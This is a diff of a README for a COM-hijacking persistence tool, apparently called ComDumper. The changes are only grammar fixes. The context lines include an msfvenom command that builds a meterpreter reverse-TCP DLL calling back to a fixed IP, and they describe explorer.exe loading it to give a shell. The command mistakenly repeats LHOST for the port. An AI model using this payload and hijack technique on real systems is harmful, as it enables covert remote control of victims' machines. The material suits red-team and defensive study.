@@ -72,16 +72,16 @@ generate first a simple dll with  `msfvenome`
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.136.138 LHOST=4444 -f dll -o shell.dll
 ```
-adding the dll  `ComDumper` backup it automaticaly so you can recover it later.
+Adding the dll. `ComDumper` backup it automaticaly so you can recover it later.
 ![image](https://github.com/user-attachments/assets/1c6b6196-004f-47da-a8f8-510de25985b7)
 
 By navigating to a folder containing ZIP files, we can observe that `explorer.exe` loads `shell.dll`.
 ![image](https://github.com/user-attachments/assets/0bf130b5-aa07-48df-bebe-cfe1cedfcedc)
 
-we have got the shell
+we have got meterpreter session.
 ![image](https://github.com/user-attachments/assets/737e31ff-e43d-44d2-9382-9279409a733d)
 
-now can recover it back
+now we can recover it back.
 ![image](https://github.com/user-attachments/assets/43240580-fb13-46f9-8f2e-13a241b948fc)
 
 For `--hkcu` mode, we can enumerate COM objects used by scheduled tasks using the [Get-ScheduledTaskComHandler.ps1]()https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1 script, created by Matt Nelson and Matthew Graeber. I will might add a C# class to enumerate scheduled tasks later.
@@ -90,10 +90,10 @@ For `--hkcu` mode, we can enumerate COM objects used by scheduled tasks using th
 . .\Get-ScheduledTaskComHandler
 Get-ScheduledTaskComHandler -PersistenceLocations
 ```
-we can take an example for this mode using `CacheTask`.
+We can take an example for this mode using `CacheTask`.
 ![image](https://github.com/user-attachments/assets/802b8c81-ed06-4cef-9ad7-f450a07c94f9)
 
-we can verify that the entry comes from HKLM.
+We can verify that the entry comes from HKLM.
 ![image](https://github.com/user-attachments/assets/c6d32948-1398-4348-9d24-fa32e4a3a17c)
 
 Generate a DLL as in the previous step.
